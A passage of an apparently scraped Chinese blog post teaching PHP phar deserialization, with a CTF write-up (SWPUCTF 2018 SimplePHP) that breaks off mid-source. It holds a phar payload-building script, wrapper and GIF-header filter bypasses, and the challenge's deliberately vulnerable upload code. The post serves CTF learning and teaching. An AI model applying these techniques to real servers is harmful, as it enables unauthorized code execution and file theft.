{"blogid": "122930867", "writerAge": "码龄2年", "writerBlogNum": "117", "writerCollect": "140", "writerComment": "14", "writerFan": "336", "writerGrade": "4级", "writerIntegral": "1238", "writerName": "Z3eyOnd", "writerProfileAdress": "writer_image\\profile_122930867.jpg", "writerRankTotal": "15662", "writerRankWeekly": "83304", "writerThumb": "61", "writerVisitNum": "86887", "blog_read_count": "2300", "blog_time": "已于 2022-02-27 14:22:06 修改", "blog_title": "phar反序列化+两道CTF例题", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-light\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><ul><li><a href=\"#Phar_1\">Phar反序列化</a></li><li><ul><li><a href=\"#phar_7\">什么是phar文件</a></li><li><a href=\"#_13\">常见的流包装器</a></li><li><a href=\"#phar_30\">phar文件必要的结构组成</a></li><li><a href=\"#_40\">受影响的文件操作函数</a></li><li><a href=\"#_44\">漏洞利用条件</a></li><li><a href=\"#phar_51\">phar生成</a></li><li><a href=\"#_71\">绕过方式</a></li></ul>\n</li><li><a href=\"#_94\">例题</a></li><li><ul><li><a href=\"#SWPUCTF_2018SimplePHP_96\">SWPUCTF 2018]SimplePHP</a></li><li><a href=\"#NSSCTFprize_p1_531\">[NSSCTF]prize_p1</a></li><li><ul><li><a href=\"#PHP_582\">PHP对象</a></li><li><a href=\"#_637\">绕过异常</a></li><li><a href=\"#phar_645\">phar://反序列化</a></li><li><a href=\"#getflag_661\">处理getflag()类</a></li><li><a href=\"#_673\">签名修改</a></li></ul>\n</li></ul>\n</li><li><a href=\"#_773\">参考文献</a></li></ul>\n</li></ul>\n</div>\n<p></p>\n<h2><a id=\"Phar_1\"></a>Phar反序列化</h2>\n<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。<strong>当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容</strong>。(漏洞利用点)</p>\n<h3><a id=\"phar_7\"></a>什么是phar文件</h3>\n<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>\n<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器</p>\n<h3><a id=\"_13\"></a>常见的流包装器</h3>\n<pre><code>file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n</code></pre>\n<h3><a id=\"phar_30\"></a>phar文件必要的结构组成</h3>\n<blockquote>\n<p>stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</p>\n<p>manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</p>\n<p>content:被压缩文件的内容</p>\n<p>signature (可空):签名，放在末尾。</p>\n</blockquote>\n<h3><a id=\"_40\"></a>受影响的文件操作函数</h3>\n<p><img alt=\"img\" src=\"image\\c32e2fe589969526050aa355aa3e4065.png\"/></p>\n<h3><a id=\"_44\"></a>漏洞利用条件</h3>\n<blockquote>\n<ol><li> <p>phar可以上传到服务器端(存在文件上传)</p> </li><li> <p>要有可用的魔术方法作为“跳板”。</p> </li><li> <p>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</p> </li></ol>\n</blockquote>\n<h3><a id=\"phar_51\"></a>phar生成</h3>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestObject</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//后缀名必须为phar</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER(); ?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//设置stub</span>\n    <span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TestObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$o</span> <span class=\"token operator\">-&gt;</span> data<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'hu3sky'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//将自定义的meta-data存入manifest</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//添加要压缩的文件</span>\n    <span class=\"token comment\">//签名自动计算</span>\n    <span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h3><a id=\"_71\"></a>绕过方式</h3>\n<p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p>\n<pre><code>compress.bzip://phar:///test.phar/test.txt\ncompress.bzip2://phar:///test.phar/test.txt\ncompress.zlib://phar:///home/sx/test.phar/test.txt\n</code></pre>\n<p>也可以利用其它协议</p>\n<pre><code>php://filter/read=convert.base64-encode/resource=phar://phar.phar\n</code></pre>\n<p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p>\n<pre><code>1、$phar-&gt;setStub(“GIF89a”.\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub\n2、生成一个phar.phar，修改后缀名为phar.gif\n</code></pre>\n<h2><a id=\"_94\"></a>例题</h2>\n<h3><a id=\"SWPUCTF_2018SimplePHP_96\"></a>SWPUCTF 2018]SimplePHP</h3>\n<p>打开网页，发现有上传文件的地方和查看文件的地方。</p>\n<p>验证，查看文件的URL</p>\n<pre><code>http://52194e11-15f5-46ef-9ddf-625a7d9d5415.node4.buuoj.cn:81/file.php?file=\n</code></pre>\n<p>file参数可以查看代码</p>\n<p>index.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"content-type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'base.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>base.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span>web3<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>link rel<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"stylesheet\"</span> href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>nav <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"navbar navbar-default\"</span> role<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"navigation\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>div <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"container-fluid\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>div <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"navbar-header\"</span><span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>a <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"navbar-brand\"</span> href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token operator\">&gt;</span>首页<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>ul <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"nav navbar-nav navbra-toggle\"</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>li <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"active\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file.php?file=\"</span><span class=\"token operator\">&gt;</span>查看文件<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"upload_file.php\"</span><span class=\"token operator\">&gt;</span>上传文件<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>ul <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"nav navbar-nav navbar-right\"</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>span <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"glyphicon glyphicon-user\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token keyword\">echo</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>nav<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>flag is in f1ag<span class=\"token operator\">.</span>php<span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n\n\n</code></pre>\n<p>在bese.php中看到<code>flag is in f1ag.php</code>，直接用file=flag is in f1ag.php,但是过滤了，不行。</p>\n<p>upload_file.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'function.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">upload_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>meta charest<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span>文件上传<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>div align<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"center\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>h1<span class=\"token operator\">&gt;</span>前端写得很low<span class=\"token punctuation\">,</span>请各位师傅见谅<span class=\"token operator\">!</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>style<span class=\"token operator\">&gt;</span>\n    p <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token argument-name\">margin</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span> auto\n    <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"upload_file.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"post\"</span> enctype<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"multipart/form-data\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>label <span class=\"token keyword\">for</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span>文件名<span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>label<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span> id<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"提交\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<p>function.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">//show_source(__FILE__);</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"base.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-type: text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">upload_file_do</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".jpg\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//mkdir(\"upload\",0777);</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">upload_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">upload_file_check</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">upload_file_do</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">upload_file_check</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$allowed_types</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"gif\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jpeg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jpg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"png\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$extension</span> <span class=\"token operator\">=</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extension</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token comment\">//echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\";</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extension</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allowed_types</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p>上传的文件需要经过function.php的过滤，只允许四种图片的后缀才能上传。</p>\n<p>file.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"content-type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'function.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'class.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/var/www/html/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2&gt;There is no file to show!&lt;h2/&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$show</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$show</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$show</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">_show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'file doesn\\'t exists.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n\n</code></pre>\n<p>file.php中include了class.php，通过class.php的<code>_show()</code>方法，将文件的内容显示出来。</p>\n<p>class.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token 